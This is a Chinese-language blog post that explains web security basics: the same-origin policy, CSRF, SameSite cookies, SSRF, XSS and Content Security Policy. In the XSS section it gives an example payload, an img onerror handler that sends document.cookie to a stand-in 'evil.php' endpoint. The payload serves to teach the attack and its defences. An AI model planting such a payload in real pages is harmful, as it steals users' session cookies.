---
title: web security
date: 2020-06-15 17:05:45
tags: Web
---

# 同源协议（SOP)
所谓的同源协议，就是阻止程序员访问第三方数据的一种手段，对浏览器本身是没有任何的影响。换句话说，图片该显示显示，但你无法获取到它的二进制，iframe该展示展示，但你获取不到它的节点，ajax该读取读取，但你获取不到它的响应文。

同源协议可以
* 跨域写操作
* 跨域嵌入操作
不可以
* 跨域读操作

# CSRF

（Cross-site request forgery）跨站请求伪造，是一种常见的攻击方式。是指 A 网站正常登陆后，cookie 正常保存，其他网站 B 通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie。
上面说了，SOP 可以通过 html tag 加载资源，而且 SOP 不阻止接口请求而是拦截请求结果，CSRF 恰恰占了这两个便宜。

```

// 使用xhr请求会受到sop限制，不会带上cookie
 <script>
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {//服务器返回值的处理函数，此处使用匿名函数进行实现
            if (xhr.readyState == 4 && xhr.status == 200) {//
                var responseText = xhr.responseText;
                document.getElementById('result').innerHTML = responseText;
            }
        };
        xhr.open("GET", "http://dummy.restapiexample.com/api/v1/employees", true);//提交get请求到服务器
        xhr.send(null);
    </script>

  // 使用img的tag请求会带上cookie
    <img src="http://dummy.restapiexample.com/api/v1/employees"/>
```

- CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。
- CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。
- 保证页面的幂等性，后端接口不要在GET页面中做用户操作。


samesite cookie

第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。
Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。但可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。
<!-- ![](/images/web_security/same_site.png) -->

# SSRF

SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器

# XSS

XSS 跨站脚本攻击，用户注入恶意的代码，浏览器和服务器没有对用户的输入进行过滤，导致用户注入的脚本嵌入到了页面中。由于浏览器无法识别这些恶意代码正常解析执行，攻击者的恶意操作被成功执行，比如可以获取用户的cookie数据然后发送给自己或者冒充正常用户向被攻击的服务器发送请求。


xss攻击分类

* 反射型：攻击者构造一个带有恶意代码的url链接诱导正常用户点击，服务器接收到这个url对应的请求读取出其中的参数然后没有做过滤就拼接到Html页面发送给浏览器，浏览器解析执行
* 存储型： 攻击者将带有恶意代码的内容发送给服务器（比如在论坛上发帖），服务器没有做过滤就将内容存储到数据库中，下次再请求这个页面的时候服务器从数据库中读取出相关的内容拼接到html上，浏览器收到之后解析执行
* dom型：dom型xss主要和前端js有关，是前端js获取到用户的输入没有进行过滤然后拼接到html中

xss危害
1. cookie劫持（窃取cookie）
2. 钓鱼，利用xss构造出一个登录框，骗取用户账户密码。

利用错误信息和搜索结果的反射进行的 XSS，称为反射型 XSS
盗取用户 cookie，例如插入这样一段代码
```
<img
  src="xx"
  onerror="post('../evil.php?cakemonster=' + escape(document.cookie))"
/>
```

还有另一种 XSS 是储存型 XSS。储存型也比较容易理解，攻击者把恶意脚本提交到被害服务器，并成功储存，所有人访问特定页面都会遭到攻击。

总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。

XSS防御：

对于XSS攻击来说，通常有两种方式来进行防御。

1、转义字符；
2、CSP安全内容策略：CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

# Content Security Policy

CSP 诞生的主要目的就是防御 XSS 攻击. 严格的 CSP 在 XSS 的防范中可以起到以下的作用：
* 禁止加载外域代码，防止复杂的攻击逻辑。
* 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
* 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
* 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
* 合理使用上报可以及时发现 XSS，利于尽快修复问题。

CSP 的作用
1. 不允许内联script执行
2. 不允许加载非信任的脚本资源
3. 不允许向非信任的url发送信息

通常可以通过两种方式来开启 CSP：

* 设置 HTTP Header 中的 Content-Security-Policy
* 设置 meta 标签的方式

CSP doesn't (and can't) prevent CSRF. Even if you forbid all scripts from executing, CSRF attacks are still possible if no per-request tokens are used
